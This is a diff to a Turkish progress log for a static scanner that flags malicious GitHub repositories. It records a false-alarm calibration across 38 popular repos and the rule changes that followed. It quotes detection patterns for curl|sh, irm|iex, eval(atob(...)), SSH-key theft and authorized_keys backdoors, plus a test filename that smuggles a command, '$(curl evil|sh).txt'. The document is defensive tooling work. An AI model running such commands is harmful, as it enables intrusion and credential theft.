@@ -15,8 +15,9 @@ Son güncelleme: **9 Ekim 2026**. Kurallar ve mimari için `CLAUDE.md`, ne yapı
 | JSON API: `GET /api/scan?repo=owner/name` | Hazır |
 | CLI: `npm run scan -- owner/repo` | Hazır |
 | Safe Zone ve Scammer sayfaları, kalıcı depolama (Neon Postgres) | Kod hazır; veritabanını kullanıcı Vercel'den bağlayacak |
-| Zararlı bağımlılık kontrolü (OSV) | Hazır (6. oturum); canlıda doğrulanmalı |
-| Testler | 18 dosya, 620 test |
+| Zararlı bağımlılık kontrolü (OSV) | Hazır (6. oturum); rapordaki satır 7. oturumda her duruma görünür yapıldı, canlıda doğrulanmalı |
+| Yanlış alarm kalibrasyonu | 1. tur yapıldı (7. oturum): 38 popüler temiz repodan 28'i Temiz (önce 15) |
+| Testler | 20 dosya, 727 test |
 | Vercel'e deploy | Kod `main`'de; token ve veritabanını kullanıcı ekleyecek (adımlar aşağıda) |
 | VirusTotal API | Yok (API anahtarı gerekiyor, kullanıcıya sorulacak) |
 
@@ -50,8 +51,8 @@ Son güncelleme: **9 Ekim 2026**. Kurallar ve mimari için `CLAUDE.md`, ne yapı
 - [x] **Aşama 0: Sıfırdan başlangıç.** Eski Python kodu silindi, Next.js + TypeScript iskeleti kuruldu.
 - [x] **Aşama 1: MVP.** Motor, 27 kural, web arayüzü, API, CLI, demo rapor, testler, `CLAUDE.md` ve `PROGRESS.md`.
 - [x] **Aşama 1.5: Safe Zone ve Scammer.** Taramaların Postgres'e kaydedilmesi, iki liste sayfası, veritabanından önbellek, "Scan again now".
-- [ ] **Aşama 2: Yayına alma.** Dalın `main`'e birleştirilmesi, Vercel'e deploy, `GITHUB_TOKEN`, Neon veritabanı, gerçek repolarda deneme ve kalibrasyon (aşağıdaki listeyle).
-- [ ] **Aşama 3: Daha derin analiz.** Bağımlılıklar için OSV, release digest'leri için VirusTotal API (kotaya dikkat), commit geçmişi sinyalleri (repo'dan eski commit tarihleri), typosquatting (popüler paket adlarına benzeyen bağımlılıklar), `setup.py` için `ast` tabanlı veri akışı analizinin geri getirilmesi.
+- [ ] **Aşama 2: Yayına alma.** Dalın `main`'e birleştirilmesi, Vercel'e deploy, `GITHUB_TOKEN`, Neon veritabanı (yapıldı), gerçek repolarda deneme ve kalibrasyon (1. tur 7. oturumda yapıldı; test dosyası ve repo itibarı kararı bekleniyor).
+- [ ] **Aşama 3: Daha derin analiz.** Bağımlılıklar için OSV (yapıldı, 6. oturum), release digest'leri için VirusTotal API (kotaya dikkat), commit geçmişi sinyalleri (repo'dan eski commit tarihleri), typosquatting (popüler paket adlarına benzeyen bağımlılıklar), `setup.py` için `ast` tabanlı veri akışı analizinin geri getirilmesi.
 - [ ] **Aşama 4: Paylaşım ve kötüye kullanıma karşı koruma.** Listelerde sayfalama ve arama, tarama geçmişi (aynı reponun eski sonuçları), veritabanında kalıcı hız sınırı, Cloudflare Turnstile.
 - [ ] **Aşama 5: Vitrin.** README'ye ekran görüntüleri ve mimari diyagram, "nasıl çalışır" ve "sınırlamalar" sayfaları, Open Graph görselleri.
 - [ ] **Aşama 6 (opsiyonel):** Tarayıcı eklentisi (GitHub sayfasında rozet), GitHub Action, Gradle/Podfile/Makefile kuralları, LLM ile bulgu özeti.
@@ -216,7 +217,9 @@ Son güncelleme: **9 Ekim 2026**. Kurallar ve mimari için `CLAUDE.md`, ne yapı
 - **Doğrulanmadı:** `api.osv.dev` bu çalışma ortamının ağ politikasında kapalı, OSV burada "unavailable" döndü. Gerçek OSV yanıtıyla doğrulama canlı sitede yapılacak.
 - Kullanıcının üç reposu yeni kurallarla yanlış alarm vermedi (PocketWallet'taki `.claude/settings.json` yalnızca plugin ayarı içeriyor).
 
-### 9 Ekim 2026 (7. oturum): OSV satırı canlıda görünmüyordu
+### 9 Ekim 2026 (7. oturum): OSV satırı ve 38 repoyla yanlış alarm kalibrasyonu
+
+#### OSV satırı canlıda görünmüyordu (PR #6)
 
 **Sorun:** Kullanıcı canlı sitede OSV ile ilgili hiçbir şey görmedi. İki sebep vardı:
 - Site, son 1 saat içinde taranmış bir repo için veritabanındaki raporu veriyor. Kullanıcının repoları OSV kontrolü yayına girmeden önce taranmıştı; bu eski raporlarda `dependencyCheck` alanı yok, arayüz de bu durumda hiçbir şey göstermiyordu.
@@ -227,23 +230,150 @@ Son güncelleme: **9 Ekim 2026**. Kurallar ve mimari için `CLAUDE.md`, ne yapı
 - Rapor özetinde artık her zaman bir "Malicious dependencies (OSV)" satırı var. Kaç paket kontrol edildi, bağımlılık dosyası yok mu, OSV'ye ulaşılamadı mı ya da rapor bu kontrolden eski mi, satırda yazıyor. Arşiv kontrolü de aynı listede gösteriliyor.
 - Testler: eski motor sürümüyle kaydedilmiş raporun yeniden taranması, arayüzde üç durumun (paket sayısı, dosya yok, eski rapor) yazılması.
 
+#### Yanlış alarm kalibrasyonu (1. tur)
+
+**İstek:** Önceki önerinin 3. maddesi: popüler ve temiz repoları toplu tarayıp hangi kuralın yanlış alarm verdiğini ölçmek ve kuralları düzeltmek.
+
+**Yöntem:**
+- 38 popüler repo seçildi: JavaScript (react, vue, express, vite...), Python (django, flask, pip, poetry...), Rust (uv, rustup, ripgrep), Windows (terminal, PowerShell, notepad++), kurulum araçları (nvm, ohmyzsh, Homebrew), dev ortamı repoları (devcontainers, vscode-extension-samples, claude-code) ve link listeleri (awesome, public-apis, free-programming-books).
+- Bu ortamdaki proxy, başka repoların GitHub API'sine izin vermiyor. Bu yüzden repolar `git clone --depth 1` ile indirildi ve aynı motorla yerelde tarandı. Kod çalıştırılmadı, dosyalar yalnızca okundu.
+- Bu yerel taramada limit uygulanmadı, bütün dosyalara bakıldı. Repo yaşı ve hesap sinyalleri de yok; tüm repolar eski ve köklü sayıldı.
+- Tekrar üretmek için: `npm run calibrate -- <klon-klasörü>` (`scripts/calibrate.ts`, liste `scripts/calibration-repos.txt`).
+
+**Sonuç:**
+
+| | Önce | Sonra |
+| --- | --- | --- |
+| Temiz | 15 | 28 |
+| Şüpheli | 12 | 5 |
+| Tehlikeli | 11 | 5 |
+
+| Repo | Önce | Sonra | Kalan kurallar |
+| --- | --- | --- | --- |
+| `expressjs/express` | Temiz 20 | Temiz 0 | - |
+| `axios/axios` | Şüpheli 58 | Temiz 13 | GR-AUTO-001 +10, GR-CODE-004 +3 |
+| `lodash/lodash` | Şüpheli 65 | Temiz 10 | GR-CODE-001 +10 |
+| `facebook/react` | Şüpheli 55 | Temiz 25 | GR-AUTO-008 +15, GR-AUTO-001 +10 |
+| `vuejs/core` | Temiz 15 | Temiz 0 | - |
+| `sveltejs/svelte` | Şüpheli 60 | Temiz 25 | GR-OBF-002 +15, GR-AUTO-001 +10 |
+| `prettier/prettier` | Temiz 20 | Temiz 20 | GR-OBF-001 +15, GR-CI-001 +5 |
+| `eslint/eslint` | Temiz 15 | Temiz 10 | GR-AUTO-001 +10 |
+| `vitejs/vite` | Şüpheli 30 | Temiz 0 | - |
+| `nvm-sh/nvm` | Temiz 20 | Temiz 5 | GR-CI-001 +5 |
+| `ohmyzsh/ohmyzsh` | Şüpheli 58 | Temiz 3 | GR-CODE-004 +3 |
+| `Homebrew/install` | Temiz 0 | Temiz 0 | - |
+| `mozilla/pdf.js` | Temiz 25 | Temiz 25 | GR-OBF-001 +15, GR-AUTO-008 +10 |
+| `gorhill/uBlock` | Temiz 25 | Temiz 25 | GR-LINK-001 +20, GR-CODE-003 +5 |
+| `electron/electron` | Tehlikeli 100 | Tehlikeli 100 | GR-CODE-007 +35, GR-BIN-001 +30, GR-LINK-001 +20, GR-CODE-004 +15, GR-OBF-001 +15, GR-AUTO-001 +10, GR-CODE-003 +5 |
+| `microsoft/vscode-extension-samples` | Temiz 15 | Temiz 10 | GR-AUTO-001 +10 |
+| `devcontainers/templates` | Temiz 15 | Temiz 10 | GR-AUTO-006 +10 |
+| `anthropics/claude-code` | Tehlikeli 85 | Tehlikeli 70 | GR-CODE-002 +35, GR-LINK-001 +20, GR-OBF-002 +15 |
+| `sindresorhus/awesome` | Temiz 0 | Temiz 0 | - |
+| `tldr-pages/tldr` | Tehlikeli 88 | Temiz 8 | GR-CODE-007 +5, GR-CODE-004 +3 |
+| `pallets/flask` | Temiz 0 | Temiz 0 | - |
+| `django/django` | Tehlikeli 100 | Temiz 20 | GR-LINK-001 +20 |
+| `psf/requests` | Temiz 0 | Temiz 0 | - |
+| `pypa/pip` | Tehlikeli 90 | Şüpheli 40 | GR-BIN-001 +20, GR-LINK-001 +20 |
+| `NVIDIA/apex` | Temiz 10 | Temiz 10 | GR-AUTO-002 +10 |
+| `pycurl/pycurl` | Şüpheli 35 | Temiz 10 | GR-AUTO-002 +10 |
+| `python-poetry/poetry` | Şüpheli 30 | Temiz 15 | GR-AUTO-002 +10, GR-BIN-001 +5 |
+| `astral-sh/uv` | Tehlikeli 100 | Şüpheli 55 | GR-BIN-001 +20, GR-LINK-001 +20, GR-AUTO-005 +5, GR-CI-001 +5, GR-CODE-002 +5 |
+| `rust-lang/rustup` | Tehlikeli 80 | Tehlikeli 80 | GR-CODE-002 +35, GR-SOC-001 +25, GR-LINK-001 +20 |
+| `BurntSushi/ripgrep` | Temiz 25 | Temiz 25 | GR-LINK-001 +20, GR-AUTO-005 +5 |
+| `microsoft/terminal` | Şüpheli 65 | Şüpheli 35 | GR-BIN-001 +20, GR-AUTO-004 +10, GR-CODE-007 +5 |
+| `notepad-plus-plus/notepad-plus-plus` | Tehlikeli 100 | Şüpheli 35 | GR-BIN-001 +20, GR-AUTO-004 +10, GR-CODE-007 +5 |
+| `PowerShell/PowerShell` | Tehlikeli 100 | Tehlikeli 95 | GR-CODE-002 +35, GR-CODE-004 +25, GR-LINK-001 +20, GR-CODE-003 +10, GR-BIN-001 +5 |
+| `cli/cli` | Tehlikeli 100 | Şüpheli 35 | GR-BIN-001 +20, GR-CODE-004 +15 |
+| `junegunn/fzf` | Temiz 0 | Temiz 0 | - |
+| `public-apis/public-apis` | Şüpheli 55 | Temiz 0 | - |
+| `EbookFoundation/free-programming-books` | Şüpheli 55 | Temiz 20 | GR-LINK-001 +20 |
+| `microsoft/vscode` | Tehlikeli 100 | Tehlikeli 100 | GR-AUTO-003 +35, GR-CODE-002 +35, GR-CODE-007 +35, GR-CODE-004 +25, GR-BIN-001 +20, GR-OBF-001 +15, GR-AUTO-001 +10, GR-AUTO-008 +10, GR-CI-001 +5, GR-CODE-003 +5 |
+
+**Bulunan hatalar ve yapılan düzeltmeler** (her biri için pozitif ve negatif fixture var):
+
+- **Link kuralları (`GR-LINK-*`):**
+  - `.com` "çalıştırılabilir uzantı" sayılıyordu. `github.com/expressjs/expressjs.com` gibi her link indirme sanılıyordu; `.com` listeden çıkarıldı.
+  - Belgelerdeki örnek adresler (`example.com`, `*.test`, `localhost`) yok sayılıyor. Kendi fixture'larımızdaki `.invalid` adresler kapsamda kaldı.
+  - Reponun kendi `releases/latest/download/` linkleri de muaf oldu (digest kontrolü bunları da kapsıyor).
+  - npm, PyPI, crates, NuGet, RubyGems paket sayfaları ve Wikipedia makaleleri indirme sayılmıyor (`npmjs.com/package/lodash.zip` gibi).
+  - Link kısaltıcı (`GR-LINK-002`) artık yalnızca tek parçalı kısa linkte ve satırda indirme bağlamı varsa sayılıyor. Bağlam: download, install, setup, mirror, exe, zip, "click here" vb. Anket ve makale linkleri sayılmıyor. Reklamlı indirme kapıları (linkvertise vb.) her zaman sayılıyor.
+  - Dosya paylaşım sitesi (`GR-LINK-003`) artık yalnızca bir dosyaya işaret eden linkte sayılıyor: kimlik, alt yol, sorgu ya da `#anahtar` içermeli. `dropbox.com/developers`, `gofile.io/api`, ana sayfalar ve `{{https://mega.nz/...}}` gibi şablonlar sayılmıyor. PDF/EPUB/görsel linkleri de sayılmıyor.
+  - Arşiv şifresi (`GR-LINK-004`) tamamen yeniden yazıldı. Eskiden dosyanın herhangi bir yerinde "zip" geçiyorsa her `password:` ve `pass:` sayılıyordu; "following pass:", tldr'nin "contraseña:" cümleleri ve README'deki kod örnekleri de buna dahildi. Artık "Password: 1234", "**Password:** `2026`", "The archive password is ..." gibi satır başındaki bir etiket ve gerçek bir değer aranıyor. Arşivden de en fazla 10 satır uzakta olmalı.
+- **Antivirüs (`GR-SOC-001`):**
+  - "add the exclusion" artık aynı satırda antivirüs/Defender geçmiyorsa sayılmıyor (cli/cli'de bir linter notuydu). "Add the folder to exclusions" kalıbı ise sayılmaya devam ediyor.
+  - CHANGELOG/HISTORY/NEWS gibi sürüm notları taranmıyor: "daha az antivirüs yanlış alarmı" bir talimat değil.
+- **`curl | sh` (`GR-CODE-002`):**
+  - Yorum satırları atlanıyor: ohmyzsh ve PowerShell kurulum scriptlerinin başındaki "Usage: sh -c "$(curl ...)"" satırları.
+  - İndirileni komut satırında yazılmış bir programa veri olarak veren satırlar (`curl ... | perl -ne '...'`, `| python -c '...'`) sayılmıyor. O program `eval`/`exec` içeriyorsa sayılıyor.
+  - Dockerfile içindeki `RUN curl | sh` konteynerin içinde çalışıyor, 5 puan alıyor.
+  - CI ayarları artık yalnızca GitHub Actions değil: GitLab CI, Azure Pipelines, CircleCI, Travis, Jenkinsfile vb. de `GR-CI-001`'e (5 puan) gidiyor.
+  - Yeni kalıp: `iex "& { $(irm https://...) }"`.
+- **Tarayıcı şifreleri (`GR-CODE-003`):** Windows DPAPI (`CryptUnprotectData`) tek başına 10 puan alıyor. Aynı dosyada tarayıcı şifre dosyaları da varsa 40 alıyor. PowerShell'in SecureString kodu tarayıcıya dokunmuyordu.
+- **SSH anahtarları (`GR-CODE-004`):**
+  - Anahtar yolu tek başına 15 puan alıyor. SSH araçları da anahtar okur: VS Code'un SSH bağlantısı, `gh ssh-key`.
+  - Aynı dosyada veri gönderme varsa 25 alıyor (`fetch`, `requests.post`, `Invoke-WebRequest`, `curl`, `nc host port`, webhook).
+  - `authorized_keys` her zaman 25 alıyor, çünkü oraya anahtar eklemek tek başına bir arka kapı.
+- **Çözüp çalıştırma (`GR-CODE-001`):** `eval(unescape(değişken))` 10 puan alıyor; eski kodda çerez ayrıştırmak için kullanılıyordu (lodash'taki firebug-lite). `eval(unescape("%..."))` gibi kodlanmış bir sabit ve `eval(atob(...))` 45 almaya devam ediyor.
+- **Windows araçları (`GR-CODE-007`):** Inno Setup/WiX/NSIS kurulum scriptlerinde (`.iss`, `.wxs`, `.nsi`) Run anahtarı ve gizli PowerShell 5 puan alıyor. Kurulum programlarının işi bu ve bu dosyalar klonlayınca çalışmıyor.
+- **Gizleme (`GR-OBF-*`):**
+  - `GR-OBF-001`: Base64 çözülüp ilk baytlarına bakılıyor. PNG/JPEG/GIF/WebP, font (TTF/WOFF), PDF, WebM/MP4, sertifika (DER), JSON, PEM, SVG ve .NET güçlü ad anahtarları ("RSA1") zararsız sayılıyor; çalıştırılabilir dosyalar ve sıkıştırılmış veri sayılmıyor.
+  - Ayrıca `ABCDEF0123...` gibi kendini tekrar eden dizgeler, `data:application/json` (source map) ve `data:video/...` adresleri, markdown link hedefleri (`](/playground#H4sI...)`) ve `anahtar=değer` biçimindeki JWT/çerez değerleri de zararsız sayılıyor. `.svg`, `.drawio` ve `.pdf` taranmıyor.
+  - Çok uzun satırlar pencereler halinde taranıyor; bir pencere başka bir dizgenin ortasında başlarsa o dizge artık ikinci kez ve yanlış hizada çözülmüyor.
+  - `GR-OBF-002`: Yalnızca metnin yönünü açan karakterler (U+202A/B/D/E, U+2066–2068) sayılıyor; tek başına kapatıcılar (U+202C, U+2069) sayılmıyor (notepad++ Kürtçe dil adı). Küçültülmüş (`*.min.js`) dosyalar atlanıyor, çünkü onları okuyan bir insan yok ki kandırılsın. Ağırlık 30'dan 15'e indi: bu bir kod inceleme saldırısı; repo zararlılarında neredeyse görülmüyor, güvenlik araçlarının testlerinde ise sık geçiyor (svelte, claude-code).
+  - `GR-OBF-003`: Boşluklar bir dizgenin içindeyse ve dizge kapandıktan sonra kod yoksa sayılmıyor. VS Code'un terminal kayıtları bu yüzden yakalanıyordu.
+  - `GR-OBF-004`: Hangul dolgu karakteri yalnızca tek başına bir değişken adı gibi duruyorsa sayılıyor; Unicode aralık tablolarında (django'daki xregexp) sayılmıyor.
+- **Otomatik çalışanlar (`GR-AUTO-*`):**
+  - Taban puanlar düşürüldü. `package.json` scripti, Visual Studio build olayı ve dev container komutu 10 puan, yapay zekâ hook'u 15 puan alıyor. Projenin kendi dosyasını çalıştırmak normal; o dosya diğer kurallarla zaten taranıyor. İndirme/çözme içeren komutlar eskisi gibi 35–40 alıyor.
+  - Yalnızca git hook kuran ya da paket yöneticisi seçtiren bilinen komutlar raporlanmıyor: `husky`, `simple-git-hooks`, `npx only-allow pnpm`, `lefthook install`. Bu, tam eşleşme gerektiriyor; yanlarına bir şey eklenirse yine sayılıyor.
+  - `node -e`/`python -c` artık yalnızca içindeki kod süreç, ağ ya da çözme kullanıyorsa riskli sayılıyor. Electron'un `node -e 'process.exit(0)'` komutu 35 alıyordu.
+  - Visual Studio build olayında yerel bir `.ps1` dosyasını çalıştıran PowerShell artık 10 puan. İndirme, `-w hidden`, `-enc`, `iex` ya da rundll32/regsvr32/mshta gibi LOLBin'ler 40 almaya devam ediyor; 2021'deki Lazarus saldırısının biçimi için bir fixture var.
+  - `setup.py`'deki dosya düzeyi kontrol, indirme aracını yalnızca bir komut olarak geçiyorsa sayıyor (`["curl", ...]`, `"curl -fsSL ..."`). "Curl directory does not exist" gibi mesajlar sayılmıyor; pycurl 10 puanla Temiz.
+- **İkili dosyalar (`GR-BIN-001`):** Python wheel ve NuGet paketlerinin içindeki DLL/EXE 5 puan alıyor. Bunlar paket yöneticisi içindir, kimse içlerine çift tıklamaz. Tek başına duran `.exe`/`.dll` eskisi gibi 20 alıyor.
+
+**Tespit gücü düşmedi mi?** `tests/calibration.test.ts` iki yönü de kilitliyor:
+- Şu zararlı biçimler hâlâ yakalanıyor: sahte iş mülakatı reposu, `postinstall` + `curl | sh`, VS Code `folderOpen` görevi, Visual Studio'da gizli PowerShell, tarayıcı + cüzdan + webhook çalan dosya, anahtarı okuyup gönderen dosya, `setup.py` indirmesi, "antivirüsü kapat ve irm | iex çalıştır" README'si.
+- Bu turda yanlış alarm veren meşru kalıplar ise sessiz kalıyor.
+- Bir düzeltmeyi bu yüzden geri aldım: README'deki `irm ...ps1 | iex` satırını kurulum komutu sayıp muaf tutmak, "antivirüsü kapat, şunu çalıştır" tuzağını Temiz'e düşürüyordu.
+
+**Kalan 10 repo neden hâlâ Şüpheli/Tehlikeli** (hepsi gerçekten o kalıbı içeriyor; kural hatası değil):
+- **Güvenlik testleri:** claude-code ve electron, kendi güvenlik özelliklerinin testlerinde bu kalıpları bilerek kullanıyor:
+  - claude-code: testte `'$(curl evil|sh).txt'` dosya adı ve U+202E karakteri
+  - electron: test için commit'lenmiş bir `.lnk` dosyası
+  - PowerShell: testlerde SSH anahtarı üretip `authorized_keys`'e yazan yardımcı
+  - VS Code: SSH testleri
+- **Kurulum aracı olan projeler:** rustup ve PowerShell'in işi `curl | sh` ve `irm | iex` ile kurulum yapmak. rustup'ın SSS'sinde "Disable antivirus scanner and try again" cümlesi gerçekten var.
+- **Commit'lenmiş programlar:** pip (Windows başlatıcıları), uv (trampolinler), terminal (nuget.exe, WinAppDriver), notepad++ (test DLL'leri), cli/cli (test zip'indeki gh.exe).
+- **VS Code gerçekten bu kodları içeriyor:** Copilot'un `curl | bash` ile kurulum yapan kodu, `folderOpen` görevi, gizli PowerShell çalıştıran kurulum scripti, SSH anahtarı okuyan uzak bağlantı kodu.
+
+**Kullanıcıya sorulacak iki karar** (CLAUDE.md'deki kararlarla ilgili olduğu için sormadan uygulanmadı):
+1. **Test dosyaları.**
+   - Bulgular `test/`, `tests/`, `spec/`, `__tests__/`, `fixtures/` altındaysa raporda ayrı bir "test dosyalarında" grubunda gösterilebilir.
+   - Puanı düşürmek ise CLAUDE.md'deki "klasöre göre puan düşürülmez" kararıyla çelişir: saldırgan payload'ı `tests/` içine saklayabilir.
+   - Orta yol: yalnızca gösterimi ayırmak, ya da test klasöründeki bulguların tek başına Tehlikeli yapamaması (en fazla Şüpheli).
+2. **Repo itibarı.**
+   - Çok yıldızlı, yıllardır aktif ve köklü bir hesaba ait repolarda karar en fazla Şüpheli olabilir. Bunun istisnası GR-DEP-001 gibi kesin göstergeler.
+   - Riski: yıldızlar satın alınabiliyor, eski hesaplar ele geçirilebiliyor. Ele geçirilmiş popüler bir repoya eklenen zararlı kod "Tehlikeli" yerine "Şüpheli" görünür.
+
 ## Sıradaki adımlar (öncelik sırasıyla)
 
-1. **Gerçek repolarda kalibrasyon** (devam ediyor; kullanıcının üç reposu tamamlandı).
-2. **Canlıda OSV doğrulaması:** Vercel'deki sitede bir repo taranınca raporda "Checked N packages against OSV's malicious-package list" satırı görünmeli.
-3. **Alt modüller** (`.gitmodules`): tarball başka repolardaki alt modülleri içermez, `git clone --recursive` ise getirir. En azından raporda gösterilmeli.
-4. **Diğer arşiv biçimleri** (`.rar`, `.7z`, `.tar.gz`, `.jar`) şu an açılmıyor. En az şu repolar taranıp sonuçlar bu dosyaya yazılmalı: `octocat/Hello-World` (Temiz beklenir), `nvm-sh/nvm` (README'deki `curl | bash` belgede olduğu için puan almamalı), `pallets/flask`, `microsoft/vscode`, `pypa/pip`, `NVIDIA/apex` (`setup.py` alt süreç çalıştırıyor: 10 puan, Temiz beklenir). Yanlış alarm veren kurallar ayarlanmalı.
-3. **Liste kalitesi.** Scammer listesi herkese açık olduğu için yanlış alarmlar orada daha görünür olur. Kalibrasyondan sonra gerekirse listeye girme eşiği yükseltilebilir ya da çok yıldızlı / eski repolar için ek kontrol eklenebilir.
-4. **Güvenlik araçlarının kendi test dosyaları.** GitRay gibi tarayıcıların fixture'ları kaçınılmaz olarak Tehlikeli çıkıyor. Seçenekler: `tests/fixtures/` gibi yollar için bilgi notu (puanı düşürmeden), ya da kullanıcıya "bu bulgular test dosyalarında" diye gruplama. Klasöre göre puan düşürmek saldırganın payload'ı `tests/` içine saklamasına izin verir; bu yüzden puan düşürülmemeli.
-5. **VirusTotal ve OSV** (kullanıcıya sorulacak): release digest'lerini VirusTotal API ile otomatik sorgulama (günde 500 istek; kota dolarsa "atlandı"), `package.json` / `requirements.txt` bağımlılıklarını OSV ile kontrol.
+1. **Kullanıcının kararı:** yukarıdaki iki soru (test dosyaları, repo itibarı). Sonra kalibrasyonun 2. turu.
+2. **Canlıda doğrulama:** Vercel'de bir repo taranınca raporda "Malicious dependencies (OSV)" satırı görünmeli. Yeni motor sürümüyle (0.3.0) Scammer listesindeki eski kayıtlar yeniden taranınca çoğu listeden çıkmalı.
+3. **Liste kalitesi.** Scammer listesi herkese açık; kalan yanlış alarmlar orada görünür. Test dosyası ve itibar kararından sonra gerekirse listeye girme eşiği yükseltilebilir.
+4. **Kötüye kullanıma karşı koruma:** Cloudflare Turnstile, veritabanında kalıcı hız sınırı.
+5. **Alt modüller** (`.gitmodules`): tarball başka repolardaki alt modülleri içermez, `git clone --recursive` ise getirir. En azından raporda gösterilmeli.
+6. **Diğer arşiv biçimleri** (`.rar`, `.7z`, `.tar.gz`, `.jar`) şu an açılmıyor.
+7. **VirusTotal API** (kullanıcıya sorulacak; anahtar gerekiyor): release digest'lerini otomatik sorgulama (günde 500 istek; kota dolarsa "atlandı").
+8. **Tasarım** (kullanıcının isteği, en son): koyu tema yerine daha açık ve okunaklı bir arayüz.
 
 ## Bilinen sınırlamalar ve kalibrasyon notları
 
 - Statik ve kalıp tabanlı: bilinmeyen ya da iyi gizlenmiş zararlı kod kaçabilir. Temiz sonuç garanti değildir; arayüz bunu her yerde söylüyor.
 - `GR-AUTO-002` (`setup.py`) şu an satır ve dosya düzeyinde regex kullanıyor. Eski Python sürümündeki `ast` tabanlı veri akışı analizi (`replace`, `swapcase`, `chr`, ters çevirme ile gizlenmiş komutları yakalıyordu) taşınmadı. Gizlenmiş bir indirme komutu şu an 10 puan alabilir. Gerekirse Aşama 3'te TypeScript'e uyarlanabilir (eski kod: `git show a59f432:src/gitray/engine/pyflow.py`).
 - `GR-AUTO-002`: `exec(open('pkg/version.py').read())` ile sürüm okuyan meşru `setup.py` dosyaları `GR-CODE-008` altında 10 puan alır (tek başına Temiz).
-- `GR-AUTO-005`: Önceden derlenmiş kütüphane indiren meşru `-sys` crate'leri (`build.rs` içinde ağ kullanımı) 35 puanla Şüpheli çıkabilir. Kalibrasyonda kontrol edilmeli.
-- `GR-OBF-001`: Test vektörleri, gömülü anahtarlar ve sertifikalar yanlış alarm verebilir; ağırlığı bu yüzden düşük (15).
+- `GR-AUTO-005`: Önceden derlenmiş kütüphane indiren meşru `-sys` crate'leri (`build.rs` içinde ağ kullanımı) 35 puanla Şüpheli çıkabilir. Kalibrasyondaki Rust repoları (uv, ripgrep, rustup) yalnızca `git` çalıştırıyor ve 5 puan aldı.
+- `GR-OBF-001`: Bilinen biçimler (görsel, font, sertifika, JSON...) artık çözülüp eleniyor. Yine de rastgele test vektörleri, emscripten bellek verisi ve Yarn'ın `.yarn/releases/*.cjs` dosyasındaki sıkıştırılmış kod 15 puan alır. Yarn dosyası özellikle tartışmalı: `yarn` komutu bu dosyayı çalıştırdığı için gerçekten bir saldırı yolu olabilir.
+- Kod kalıbı kuralları bir dizgenin test verisi mi yoksa çalışan kod mu olduğunu bilemez (`'$(curl evil|sh).txt'` gibi test adları). Klasöre göre puan düşürülmüyor (bkz. 7. oturumdaki karar soruları).
+- README'deki kurulum satırları (`curl | sh`) puan almaz; aynı satırın PowerShell hali (`irm ...ps1 | iex`) `.ps1` linki olduğu için `GR-LINK-001` ile 20 alır. Bu bilerek bırakıldı: "antivirüsü kapat, şunu çalıştır" tuzaklarının sinyali.
 - `GR-LINK-001`: Kendi web sitesinden `.exe`/`.dmg` dağıtan meşru projeler 20 puan alır (tek başına Temiz).
 - Şifreli RAR yalnızca başlıkları da şifreliyse (`rar -hp`) tespit edilir; 7z şifrelemesi tespit edilmiyor.
 - İkili dosyalarda yalnızca ilk 1 MB okunur; ZIP içindeki dosya adları yalnızca bu kısımdaki yerel başlıklardan okunur.
